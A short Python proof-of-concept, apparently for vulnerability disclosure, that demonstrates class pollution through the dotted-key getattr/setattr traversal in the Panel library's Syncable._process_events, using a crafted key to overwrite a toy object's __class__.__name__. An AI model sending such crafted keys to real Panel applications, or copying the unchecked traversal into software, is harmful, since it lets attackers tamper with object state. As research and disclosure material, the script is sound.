# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: Syncable._process_events
# Type: get-attr-set-attr

import panel as pn
from panel.reactive import Syncable

class Target: pass
target = Target()

payload_value = "pwnd"

def run_poc():
  # _process_events traverses dotted keys via getattr chain
  # For keys containing ".", it splits and traverses:
  #   *subpath, p = k.split('.')
  #   obj = self
  #   for sp in subpath: obj = getattr(obj, sp)
  #   obj.param.update(**{p: v})
  # We demonstrate the traversal pattern directly
  widget = pn.widgets.IntSlider(name="test", value=0)
  widget.target = target
  events = {"target.__class__.__name__": payload_value}
  # Reproduce the vulnerable traversal from _process_events
  for k, v in events.items():
    if '.' not in k:
      continue
    *subpath, p = k.split('.')
    obj = widget
    for sp in subpath:
      obj = getattr(obj, sp)
    setattr(obj, p, v)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
